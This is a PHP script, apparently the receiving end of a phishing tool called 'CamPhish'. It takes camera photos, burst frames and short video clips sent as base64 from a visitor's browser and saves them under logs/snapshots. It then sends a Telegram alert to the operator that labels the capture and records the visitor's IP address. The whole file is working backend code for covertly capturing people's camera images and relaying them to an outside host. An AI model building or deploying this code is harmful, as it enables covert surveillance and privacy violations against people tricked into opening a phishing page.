<?php
require_once __DIR__ . '/telegram_alert.php';
$date = date('dMYHis');

// ── Save snapshots directory ──────────────────────────────────────────────────
$save_dir = 'logs/snapshots';
if (!is_dir($save_dir)) mkdir($save_dir, 0777, true);

$log_dir = 'logs';
if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

// ── Handle photo / burst frame ────────────────────────────────────────────────
if (!empty($_POST['cat'])) {
    $imageData     = $_POST['cat'];
    $burst_index   = isset($_POST['burst_index'])  ? intval($_POST['burst_index'])  : 0;
    $cam_facing    = isset($_POST['cam_facing'])    ? $_POST['cam_facing']           : 'user';
    $shot_type     = isset($_POST['shot_type'])     ? $_POST['shot_type']            : 'burst';

    $filteredData  = substr($imageData, strpos($imageData, ',') + 1);
    $unencodedData = base64_decode($filteredData);

    $label    = $cam_facing === 'environment' ? 'rear' : 'front';
    $filepath = $save_dir . '/cam_' . $label . '_' . $date . '_' . sprintf('%03d', $burst_index) . '.jpg';

    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, $log_dir . '/Log.log');

    // Telegram: only alert on first burst frame to avoid spam
    if ($burst_index === 0) {
        $ip_val = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        telegram_alert("📸 <b>CamPhish — Camera Photo!</b>\n📷 Camera: <code>$label</code>\n📡 IP: <code>$ip_val</code>\n🕐 $date\n<i>Check logs/snapshots/ for photos</i>");
    }
}

// ── Handle short video clip (base64 webm blob) ────────────────────────────────
if (!empty($_POST['video_clip'])) {
    $videoData     = $_POST['video_clip'];
    $cam_facing    = isset($_POST['cam_facing']) ? $_POST['cam_facing'] : 'user';
    $label         = $cam_facing === 'environment' ? 'rear' : 'front';
    $filteredData  = substr($videoData, strpos($videoData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filepath      = $save_dir . '/vid_' . $label . '_' . $date . '.webm';
    file_put_contents($filepath, $unencodedData);
    error_log("Received\r\n", 3, $log_dir . '/Log.log');

    $ip_val = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    telegram_alert("🎥 <b>CamPhish — Video Clip!</b>\n📷 Camera: <code>$label</code>\n📡 IP: <code>$ip_val</code>\n<i>Saved: $filepath</i>");
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
